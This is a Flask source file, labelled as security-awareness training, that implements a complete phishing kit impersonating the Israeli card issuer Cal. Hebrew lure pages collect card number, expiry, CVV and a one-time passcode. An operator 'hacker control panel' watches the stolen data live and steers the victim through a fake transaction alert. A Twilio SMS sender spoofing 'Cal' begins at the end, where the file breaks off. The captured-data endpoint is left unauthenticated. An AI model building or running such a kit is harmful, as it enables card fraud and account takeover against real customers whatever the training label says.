#!/usr/bin/env python3
"""
Combined Phishing & SMS Demo - For Security Awareness Training Only
Runs phishing demo on / and SMS sender on /sms
"""

from flask import Flask, render_template_string, request, jsonify, send_file, session, redirect, url_for
from flask_wtf.csrf import CSRFProtect
from twilio.rest import Client
from datetime import datetime, timedelta
from html import escape
import os

app = Flask(__name__)
app.secret_key = os.getenv('SECRET_KEY')
if not app.secret_key:
    raise ValueError("SECRET_KEY environment variable is required")

# Enable CSRF protection
csrf = CSRFProtect(app)

# Add security headers
@app.after_request
def after_request(response):
    response.headers.add('X-Content-Type-Options', 'nosniff')
    response.headers.add('X-Frame-Options', 'DENY')
    response.headers.add('X-XSS-Protection', '1; mode=block')
    return response

# Twilio credentials - required from environment
ACCOUNT_SID = os.getenv('TWILIO_ACCOUNT_SID')
AUTH_TOKEN = os.getenv('TWILIO_AUTH_TOKEN')
if not ACCOUNT_SID or not AUTH_TOKEN:
    raise ValueError("TWILIO_ACCOUNT_SID and TWILIO_AUTH_TOKEN environment variables are required")

DEFAULT_FROM = 'Cal'

# Admin credentials - required from environment
ADMIN_USERNAME = os.getenv('ADMIN_USERNAME')
ADMIN_PASSWORD = os.getenv('ADMIN_PASSWORD')
if not ADMIN_USERNAME or not ADMIN_PASSWORD:
    raise ValueError("ADMIN_USERNAME and ADMIN_PASSWORD environment variables are required")

# Track state for phishing demo
ready_for_alert = False
captured_data = {
    'card': None,
    'otp': None
}

def is_authenticated():
    """Check if user is authenticated"""
    return session.get('authenticated', False)

def require_auth(f):
    """Decorator to require authentication"""
    def decorated_function(*args, **kwargs):
        if not is_authenticated():
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    decorated_function.__name__ = f.__name__
    return decorated_function

@app.route('/login', methods=['GET', 'POST'])
def login():
    """Login page for admin access"""
    error = None
    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')

        if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
            session['authenticated'] = True
            # Determine where to redirect based on referrer
            referrer = request.referrer or ''
            if '/sms' in referrer:
                return redirect(url_for('sms_sender'))
            else:
                return redirect(url_for('hacker_dashboard'))
        else:
            error = 'Invalid username or password'

    html = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .login-container {
            background: white;
            border-radius: 12px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            max-width: 400px;
            width: 100%;
            padding: 40px;
        }
        .header {
            text-align: center;
            margin-bottom: 30px;
        }
        .header h1 {
            color: #333;
            font-size: 24px;
            margin-bottom: 10px;
        }
        .header p {
            color: #666;
            font-size: 14px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            color: #333;
            font-weight: 500;
            margin-bottom: 8px;
            font-size: 14px;
        }
        input {
            width: 100%;
            padding: 12px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        input:focus {
            outline: none;
            border-color: #667eea;
        }
        .submit-btn {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s;
        }
        .submit-btn:hover {
            transform: translateY(-2px);
        }
        .error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
            border-radius: 8px;
            padding: 12px;
            margin-bottom: 20px;
            font-size: 14px;
        }
        .warning {
            background: #fff3cd;
            border: 2px solid #ffc107;
            border-radius: 8px;
            padding: 15px;
            margin-top: 20px;
            text-align: center;
            color: #856404;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="header">
            <h1>🔐 Admin Login</h1>
            <p>Restricted Access - Demo Mode</p>
        </div>

        {% if error %}
        <div class="error">{{ error }}</div>
        {% endif %}

        <form method="POST">
            <input type="hidden" name="csrf_token" value="{{ csrf_token() }}"/>
            <div class="form-group">
                <label for="username">Username</label>
                <input type="text" id="username" name="username" placeholder="Enter username" required autofocus>
            </div>

            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Enter password" required>
            </div>

            <button type="submit" class="submit-btn">Login</button>
        </form>

        <div class="warning">
            ⚠️ This is a restricted access area for authorized users only.
        </div>
    </div>
</body>
</html>
    """
    return render_template_string(html, error=error)

@app.route('/logout')
def logout():
    """Logout user"""
    session.pop('authenticated', None)
    return redirect(url_for('login'))

@app.route('/logo.png')
def serve_logo():
    """Serve the logo image"""
    return send_file('logo.png', mimetype='image/png')

@app.route('/', methods=['GET'])
def phishing_form():
    """Serve the fake payment form"""
    html = render_template_string("""
<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>אתר מתחזה</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 12px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            max-width: 450px;
            width: 100%;
            padding: 40px;
        }
        .header {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo {
            max-width: 200px;
            height: auto;
            margin: 0 auto 20px;
            display: block;
        }
        h1 {
            color: #333;
            font-size: 24px;
            margin-bottom: 20px;
        }
        .notice {
            background: #e3f2fd;
            border: 2px solid #2196F3;
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 30px;
            color: #1565C0;
            font-size: 15px;
            line-height: 1.6;
            text-align: center;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            color: #333;
            font-weight: 500;
            margin-bottom: 8px;
            font-size: 14px;
        }
        input {
            width: 100%;
            padding: 12px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 0.3s;
            direction: ltr;
            text-align: left;
        }
        input:focus {
            outline: none;
            border-color: #667eea;
        }
        .card-row {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
        }
        .submit-btn {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s;
        }
        .submit-btn:hover {
            transform: translateY(-2px);
        }
        .security-badge {
            text-align: center;
            margin-top: 20px;
            color: #666;
            font-size: 12px;
        }
        .security-badge::before {
            content: "🔒 ";
        }
        .warning {
            background: #fff3cd;
            border: 2px solid #ffc107;
            border-radius: 8px;
            padding: 15px;
            margin-top: 20px;
            text-align: center;
            color: #856404;
            font-size: 13px;
            font-weight: 600;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="/logo.png" alt="Logo" class="logo">
        </div>

        <div class="notice">
    שלום, הגעת לאתר מחלקת ביטחון של חברת כאל, אנו מבינים כי קבלת הודעה על עסקה חשודה. אין בעיה, אנחנו על זה, אבל קודם כל מספר פרטים מזהים
    
        </div>

        <form id="paymentForm" method="POST" action="/submit">
            <input type="hidden" name="csrf_token" value="{{ csrf_token() }}"/>
            <div class="form-group">
                <label for="cardName">שם בעל הכרטיס</label>
                <input type="text" id="cardName" name="cardName" placeholder="ישראל ישראלי" required>
            </div>

            <div class="form-group">
                <label for="cardNumber">מספר כרטיס</label>
                <input type="text" id="cardNumber" name="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
            </div>

            <div class="card-row">
                <div class="form-group">
                    <label for="expiry">תוקף</label>
                    <input type="text" id="expiry" name="expiry" placeholder="MM/YY" maxlength="5" required>
                </div>

                <div class="form-group">
                    <label for="cvv">CVV</label>
                    <input type="text" id="cvv" name="cvv" placeholder="123" maxlength="4" required>
                </div>
            </div>

            <button type="submit" class="submit-btn">המשך</button>

            <div class="security-badge">
                אבטחת SSL | הצפנה 256-ביט
            </div>
        </form>
    </div>

    <script>
        // Luhn algorithm for credit card validation
        function luhnCheck(cardNumber) {
            cardNumber = cardNumber.replace(/\D/g, '');
            if (cardNumber.length < 13 || cardNumber.length > 19) return false;

            let sum = 0, isEven = false;
            for (let i = cardNumber.length - 1; i >= 0; i--) {
                let digit = parseInt(cardNumber.charAt(i));
                if (isEven) {
                    digit *= 2;
                    if (digit > 9) digit -= 9;
                }
                sum += digit;
                isEven = !isEven;
            }
            return (sum % 10) === 0;
        }

        function validateExpiryDate(expiry) {
            if (!/^\d{2}\/\d{2}$/.test(expiry)) return false;
            const [month, year] = expiry.split('/').map(num => parseInt(num));
            if (month < 1 || month > 12) return false;

            const now = new Date();
            const currentMonth = now.getMonth() + 1;
            const currentYear = now.getFullYear() % 100;

            if (year < currentYear) return false;
            if (year === currentYear && month < currentMonth) return false;
            return true;
        }

        document.getElementById('cardNumber').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\s/g, '');
            let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
            e.target.value = formattedValue;
        });

        document.getElementById('expiry').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length >= 2) {
                value = value.slice(0, 2) + '/' + value.slice(2, 4);
            }
            e.target.value = value;
        });

        document.getElementById('cvv').addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/\D/g, '');
        });

        document.getElementById('paymentForm').addEventListener('submit', function(e) {
            const cardNumber = document.getElementById('cardNumber').value;
            const expiry = document.getElementById('expiry').value;
            const cvv = document.getElementById('cvv').value;
            const cardName = document.getElementById('cardName').value.trim();

            if (cardName.length < 3) {
                e.preventDefault();
                alert('נא להזין שם בעל כרטיס תקין');
                return false;
            }

            if (!luhnCheck(cardNumber)) {
                e.preventDefault();
                alert('מספר כרטיס אינו תקין. נא לבדוק ולהזין שוב.');
                return false;
            }

            if (!validateExpiryDate(expiry)) {
                e.preventDefault();
                alert('תאריך תוקף אינו תקין או שפג תוקפו. נא להזין תאריך MM/YY תקף.');
                return false;
            }

            if (cvv.length < 3 || cvv.length > 4) {
                e.preventDefault();
                alert('CVV אינו תקין. נא להזין 3-4 ספרות.');
                return false;
            }

            return true;
        });
    </script>
</body>
</html>
    """)
    return html

@app.route('/submit', methods=['POST'])
def submit_card():
    """Handle card submission"""
    global ready_for_alert, captured_data
    ready_for_alert = False

    # Sanitize inputs to prevent XSS
    captured = {
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'cardholder_name': escape(request.form.get('cardName', '').strip()),
        'card_number': request.form.get('cardNumber', '').replace(' ', ''),
        'expiry_date': request.form.get('expiry', ''),
        'cvv': request.form.get('cvv', '')
    }

    # Store for hacker dashboard
    captured_data['card'] = captured

    loading_html = """
<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>מאמת נתונים</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 12px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            max-width: 450px;
            width: 100%;
            padding: 60px 40px;
            text-align: center;
        }
        .spinner {
            margin: 0 auto 30px;
            width: 60px;
            height: 60px;
            position: relative;
        }
        .dot {
            width: 15px;
            height: 15px;
            background: #667eea;
            border-radius: 50%;
            position: absolute;
            animation: rotate 1.5s infinite ease-in-out;
        }
        .dot:nth-child(1) { top: 0; left: 50%; margin-left: -7.5px; animation-delay: 0s; }
        .dot:nth-child(2) { top: 50%; right: 0; margin-top: -7.5px; animation-delay: 0.375s; }
        .dot:nth-child(3) { bottom: 0; left: 50%; margin-left: -7.5px; animation-delay: 0.75s; }
        .dot:nth-child(4) { top: 50%; left: 0; margin-top: -7.5px; animation-delay: 1.125s; }
        @keyframes rotate {
            0%, 100% { transform: scale(1); opacity: 1; }
            50% { transform: scale(0.5); opacity: 0.5; }
        }
        .logo {
            max-width: 200px;
            height: auto;
            margin: 0 auto 20px;
            display: block;
        }
        h1 { color: #333; font-size: 24px; margin-bottom: 15px; }
        .message { color: #666; font-size: 16px; line-height: 1.6; }
        .dots { display: inline-block; width: 30px; text-align: left; }
        .dots::after {
            content: '...';
            animation: ellipsis 1.5s infinite;
        }
        @keyframes ellipsis {
            0% { content: '.'; }
            33% { content: '..'; }
            66% { content: '...'; }
        }
    </style>
    <script>
        function checkStatus() {
            fetch('/check_ready')
                .then(response => response.json())
                .then(data => {
                    if (data.ready) {
                        window.location.href = '/transaction_alert';
                    } else {
                        setTimeout(checkStatus, 2000);
                    }
                })
                .catch(err => {
                    setTimeout(checkStatus, 2000);
                });
        }
        setTimeout(checkStatus, 2000);
    </script>
</head>
<body>
    <div class="container">
        <img src="/logo.png" alt="Logo" class="logo">
        <div class="spinner">
            <div class="dot"></div>
            <div class="dot"></div>
            <div class="dot"></div>
            <div class="dot"></div>
        </div>
        <h1>שולף נתונים</h1>
        <p class="message">נא להמתין<span class="dots"></span></p>
    </div>
</body>
</html>
    """

    return loading_html

@app.route('/check_ready', methods=['GET', 'POST'])
def check_ready():
    """Check if ready to show alert"""
    return jsonify({'ready': ready_for_alert})

@app.route('/hacker', methods=['GET'])
@require_auth
def hacker_dashboard():
    """Hacker control panel"""
    html_template = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hacker Control Panel</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Courier New', monospace;
            background: #0a0a0a;
            color: #00ff00;
            padding: 20px;
            min-height: 100vh;
        }
        .header {
            text-align: center;
            margin-bottom: 30px;
            padding: 20px;
            border: 2px solid #00ff00;
            background: #1a1a1a;
        }
        .header h1 {
            font-size: 28px;
            margin-bottom: 10px;
            text-shadow: 0 0 10px #00ff00;
        }
        .status {
            font-size: 14px;
            color: #ffff00;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
        }
        .panel {
            background: #1a1a1a;
            border: 2px solid #00ff00;
            border-radius: 5px;
            padding: 20px;
        }
        .panel h2 {
            color: #ffff00;
            margin-bottom: 15px;
            font-size: 20px;
            text-transform: uppercase;
            border-bottom: 1px solid #00ff00;
            padding-bottom: 10px;
        }
        .data-row {
            display: flex;
            justify-content: space-between;
            margin-bottom: 10px;
            padding: 8px;
            background: #0a0a0a;
            border-left: 3px solid #00ff00;
        }
        .data-label {
            color: #00ffff;
            font-weight: bold;
        }
        .data-value {
            color: #00ff00;
            font-family: monospace;
        }
        .no-data {
            text-align: center;
            color: #ff0000;
            padding: 20px;
            font-style: italic;
        }
        .control-btn {
            width: 100%;
            padding: 15px;
            background: #ff0000;
            color: #fff;
            border: 2px solid #ff0000;
            border-radius: 5px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 20px;
            text-transform: uppercase;
        }
        .control-btn:hover {
            background: #cc0000;
            box-shadow: 0 0 20px #ff0000;
        }
        .control-btn:disabled {
            background: #333;
            border-color: #333;
            color: #666;
            cursor: not-allowed;
            box-shadow: none;
        }
        .timestamp {
            color: #888;
            font-size: 12px;
            text-align: right;
            margin-top: 10px;
        }
        .full-width {
            grid-column: 1 / -1;
        }
        @keyframes blink {
            0%, 50% { opacity: 1; }
            51%, 100% { opacity: 0; }
        }
        .blinking {
            animation: blink 1s infinite;
        }
        .header-top {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
        }
        .logout-btn {
            background: #666;
            color: #fff;
            border: 1px solid #888;
            padding: 8px 16px;
            border-radius: 3px;
            cursor: pointer;
            font-size: 12px;
            text-decoration: none;
            transition: all 0.3s;
            display: inline-block;
        }
        .logout-btn:hover {
            background: #888;
            box-shadow: 0 0 10px #888;
        }
    </style>
</head>
<body>
    <input type="hidden" name="csrf_token" value="{{ csrf_token() }}"/>
    <div class="header">
        <div class="header-top">
            <div></div>
            <h1 style="margin: 0;">🎯 PHISHING CONTROL PANEL 🎯</h1>
            <a href="/logout" class="logout-btn">🚪 Logout</a>
        </div>
        <div class="status">⚠️ DEMO MODE - Security Awareness Training ⚠️</div>
    </div>

    <div class="container">
        <div class="panel">
            <h2>💳 Credit Card Capture</h2>
            <div id="cardData">
                <div class="no-data">⏳ Waiting for victim...</div>
            </div>
        </div>

        <div class="panel">
            <h2>📱 OTP Capture</h2>
            <div id="otpData">
                <div class="no-data">⏳ Waiting for OTP...</div>
            </div>
        </div>

        <div class="panel full-width">
            <h2>🎮 Flow Control</h2>
            <button id="continueBtn" class="control-btn" disabled>Continue to Transaction Alert</button>
            <button id="clearBtn" class="control-btn" style="background: #ff9800; border-color: #ff9800; margin-top: 10px;">Clear Data</button>
            <div class="timestamp" id="lastUpdate">Auto-refresh active...</div>
        </div>
    </div>

    <script>
        let hasCardData = false;

        function createDataRow(label, value) {
            const div = document.createElement('div');
            div.className = 'data-row';
            const labelSpan = document.createElement('span');
            labelSpan.className = 'data-label';
            labelSpan.textContent = label;
            const valueSpan = document.createElement('span');
            valueSpan.className = 'data-value';
            valueSpan.textContent = value;
            div.appendChild(labelSpan);
            div.appendChild(valueSpan);
            return div;
        }

        function updateDashboard() {
            fetch('/hacker/data')
                .then(response => response.json())
                .then(data => {
                    // Update card data
                    if (data.card) {
                        hasCardData = true;
                        const cardDataDiv = document.getElementById('cardData');
                        cardDataDiv.innerHTML = '';

                        cardDataDiv.appendChild(createDataRow('Cardholder:', data.card.cardholder_name));
                        cardDataDiv.appendChild(createDataRow('Card Number:', data.card.card_number));
                        cardDataDiv.appendChild(createDataRow('Expiry:', data.card.expiry_date));
                        cardDataDiv.appendChild(createDataRow('CVV:', data.card.cvv));

                        const timestamp = document.createElement('div');
                        timestamp.className = 'timestamp';
                        timestamp.textContent = data.card.timestamp;
                        cardDataDiv.appendChild(timestamp);

                        document.getElementById('continueBtn').disabled = false;
                    }

                    // Update OTP data
                    if (data.otp) {
                        const otpDataDiv = document.getElementById('otpData');
                        otpDataDiv.innerHTML = '';

                        const otpDiv = document.createElement('div');
                        otpDiv.className = 'data-row';
                        const label = document.createElement('span');
                        label.className = 'data-label';
                        label.textContent = 'OTP Code:';
                        const value = document.createElement('span');
                        value.className = 'data-value';
                        value.style.fontSize = '24px';
                        value.style.fontWeight = 'bold';
                        value.textContent = data.otp.code;
                        otpDiv.appendChild(label);
                        otpDiv.appendChild(value);
                        otpDataDiv.appendChild(otpDiv);

                        const timestamp = document.createElement('div');
                        timestamp.className = 'timestamp';
                        timestamp.textContent = data.otp.timestamp;
                        otpDataDiv.appendChild(timestamp);
                    }

                    // Update timestamp
                    document.getElementById('lastUpdate').textContent =
                        'Last update: ' + new Date().toLocaleTimeString();
                });
        }

        // Continue button handler
        document.getElementById('continueBtn').addEventListener('click', function() {
            const csrfToken = document.querySelector('input[name="csrf_token"]').value;
            fetch('/hacker/continue', {
                method: 'POST',
                headers: {
                    'X-CSRFToken': csrfToken
                }
            })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        this.textContent = '✅ Victim proceeding to transaction alert...';
                        this.disabled = true;
                        this.style.background = '#00ff00';
                        this.style.borderColor = '#00ff00';
                        this.style.color = '#000';
                    }
                });
        });

        // Clear button handler
        document.getElementById('clearBtn').addEventListener('click', function() {
            if (confirm('🗑️ Clear all captured data and reset for a new demo?')) {
                const csrfToken = document.querySelector('input[name="csrf_token"]').value;
                fetch('/hacker/clear', {
                    method: 'POST',
                    headers: {
                        'X-CSRFToken': csrfToken
                    }
                })
                    .then(response => response.json())
                    .then(data => {
                        if (data.success) {
                            // Reset the UI
                            document.getElementById('cardData').innerHTML = '<div class="no-data">⏳ Waiting for victim...</div>';
                            document.getElementById('otpData').innerHTML = '<div class="no-data">⏳ Waiting for OTP...</div>';
                            document.getElementById('continueBtn').disabled = true;
                            document.getElementById('continueBtn').textContent = 'Continue to Transaction Alert';
                            document.getElementById('continueBtn').style.background = '#ff0000';
                            document.getElementById('continueBtn').style.borderColor = '#ff0000';
                            document.getElementById('continueBtn').style.color = '#fff';
                        }
                    });
            }
        });

        // Auto-refresh every 2 seconds
        setInterval(updateDashboard, 2000);
        updateDashboard();
    </script>
</body>
</html>
    """
    return render_template_string(html_template)

@app.route('/hacker/data', methods=['GET'])
def hacker_data():
    """API endpoint for hacker dashboard data"""
    return jsonify(captured_data)

@app.route('/hacker/continue', methods=['POST'])
def hacker_continue():
    """API endpoint to continue victim flow"""
    global ready_for_alert
    ready_for_alert = True
    return jsonify({'success': True})

@app.route('/hacker/clear', methods=['POST'])
def hacker_clear():
    """API endpoint to clear captured data and reset for new demo"""
    global ready_for_alert, captured_data
    ready_for_alert = False
    captured_data = {
        'card': None,
        'otp': None
    }
    return jsonify({'success': True})

@app.route('/transaction_alert', methods=['GET'])
def transaction_alert():
    """Show transaction alert"""
    transaction_time = datetime.now() - timedelta(minutes=8)
    transaction_date = transaction_time.strftime('%d/%m/%Y')
    transaction_hour = transaction_time.strftime('%H:%M')

    html = f"""
<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>התראת עסקה</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            font-family: 'Segoe UI', Tahoma, Arial, sans-serif;
            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a6f 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }}
        .container {{
            background: white;
            border-radius: 12px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            max-width: 500px;
            width: 100%;
            padding: 40px;
        }}
        .logo {{
            max-width: 200px;
            height: auto;
            margin: 0 auto 20px;
            display: block;
        }}
        h1 {{
            color: #d32f2f;
            font-size: 22px;
            margin-bottom: 30px;
            text-align: center;
            line-height: 1.8;
        }}
        .transaction-details {{
            background: #ffebee;
            border: 2px solid #ef5350;
            border-radius: 8px;
            padding: 25px;
            margin-bottom: 30px;
        }}
        .detail-row {{
            display: flex;
            justify-content: space-between;
            margin-bottom: 15px;
            font-size: 16px;
        }}
        .detail-label {{ color: #666; font-weight: 500; }}
        .detail-value {{ color: #333; font-weight: 600; }}
        .amount {{
            font-size: 32px;
            color: #d32f2f;
            font-weight: bold;
            text-align: center;
            margin: 20px 0;
        }}
        .buttons {{ display: flex; flex-direction: column; gap: 15px; }}
        .btn {{
            padding: 16px;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s;
        }}
        .btn:hover {{ transform: translateY(-2px); }}
        .btn-ok {{ background: #4CAF50; color: white; }}
        .btn-not-me {{ background: #f44336; color: white; }}
    </style>
</head>
<body>
    <div class="container">
        <img src="/logo.png" alt="Logo" class="logo">
        <h1>בכרטיסך בוצעה עסקה בתאריך {transaction_date} בשעה {transaction_hour} בבית עסק AliExpress בסכום 1799.99$</h1>
        <div class="transaction-details">
            <div class="detail-row">
                <span class="detail-label">תאריך:</span>
                <span class="detail-value">{transaction_date}</span>
            </div>
            <div class="detail-row">
                <span class="detail-label">שעה:</span>
                <span class="detail-value">{transaction_hour}</span>
            </div>
            <div class="detail-row">
                <span class="detail-label">בית עסק:</span>
                <span class="detail-value">AliExpress</span>
            </div>
            <div class="amount">$1,799.99</div>
        </div>
        <div class="buttons">
            <button class="btn btn-ok" onclick="window.location.href='/otp'">זה בסדר אני ביצעתי</button>
            <button class="btn btn-not-me" onclick="window.location.href='/otp'">לא ביצעתי את העסקה</button>
        </div>
    </div>
</body>
</html>
    """
    return html

@app.route('/otp', methods=['GET'])
def otp_page():
    """Show OTP entry page"""
    html = render_template_string("""
<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>אימות</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 12px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            max-width: 450px;
            width: 100%;
            padding: 40px;
        }
        .header { text-align: center; margin-bottom: 30px; }
        .logo {
            max-width: 200px;
            height: auto;
            margin: 0 auto 20px;
            display: block;
        }
        h1 {
            color: #333;
            font-size: 22px;
            margin-bottom: 20px;
            line-height: 1.6;
        }
        .form-group { margin-bottom: 20px; }
        label {
            display: block;
            color: #333;
            font-weight: 500;
            margin-bottom: 8px;
            font-size: 14px;
        }
        input {
            width: 100%;
            padding: 12px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 24px;
            transition: border-color 0.3s;
            text-align: center;
            letter-spacing: 8px;
            direction: ltr;
        }
        input:focus { outline: none; border-color: #667eea; }
        .submit-btn {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s;
        }
        .submit-btn:hover { transform: translateY(-2px); }
        .info {
            text-align: center;
            color: #666;
            font-size: 14px;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="/logo.png" alt="Logo" class="logo">
            <h1>כדי לוודא את זהותך שלחנו לך קוד בן 6 ספרות למספר הטלפון הרשום במערכת</h1>
        </div>
        <form id="otpForm" method="POST" action="/verify">
            <input type="hidden" name="csrf_token" value="{{ csrf_token() }}"/>
            <div class="form-group">
                <label for="otp">הזן קוד אימות</label>
                <input type="text" id="otp" name="otp" placeholder="000000" maxlength="6" required pattern="[0-9]{6}">
            </div>
            <button type="submit" class="submit-btn">המשך</button>
            <div class="info">הקוד נשלח למספר הטלפון הרשום במערכת</div>
        </form>
    </div>
    <script>
        document.getElementById('otp').addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/\D/g, '');
        });
        document.getElementById('otp').focus();
    </script>
</body>
</html>
    """)
    return html

@app.route('/verify', methods=['POST'])
def verify_otp():
    """Handle OTP verification"""
    global captured_data
    otp = request.form.get('otp', '').strip()

    # Store OTP with sanitization
    captured_data['otp'] = {
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'code': escape(otp)
    }

    html = """
<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>בוטל בהצלחה</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 12px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            max-width: 500px;
            width: 100%;
            padding: 40px;
        }
        .green-box {
            background: #4CAF50;
            border-radius: 10px;
            padding: 30px;
            margin-bottom: 20px;
            color: white;
            text-align: center;
        }
        .green-box div {
            font-size: 20px;
            font-weight: 600;
            line-height: 1.8;
            margin-bottom: 10px;
        }
        .green-box div:last-child { margin-bottom: 0; }
        .red-box {
            background: #f44336;
            border-radius: 10px;
            padding: 25px;
            margin-bottom: 25px;
            color: white;
            text-align: center;
        }
        .red-box div {
            font-size: 17px;
            font-weight: 600;
            line-height: 1.8;
            margin-bottom: 10px;
        }
        .red-box div:last-child { margin-bottom: 0; }
        .footer {
            text-align: center;
            color: #666;
            font-size: 16px;
            font-weight: 500;
            line-height: 1.6;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="green-box">
            <div>העסקה בוטלה בהצלחה</div>
            <div>חשבונך זוכה ב 1799.99$</div>
            <div>כרטיסיך נחסם לשלוש שעות לעסקאות בחו״ל</div>
        </div>
        <div class="red-box">
            <div>שים לב יתכן ובשעות הקרובות</div>
            <div>יתקבלו הודעות נוספות על עסקאות</div>
            <div>אין צורך ליצור קשר - חשבונך נחסם זמנית והעסקאות לא יכובדו על ידנו</div>
        </div>
        <div class="footer">תודה על שיתוף הפעולה - צוות ביטחון כאל</div>
    </div>
</body>
</html>
    """
    return html

# SMS Sender Routes
SMS_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Catsec SMS Sender</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
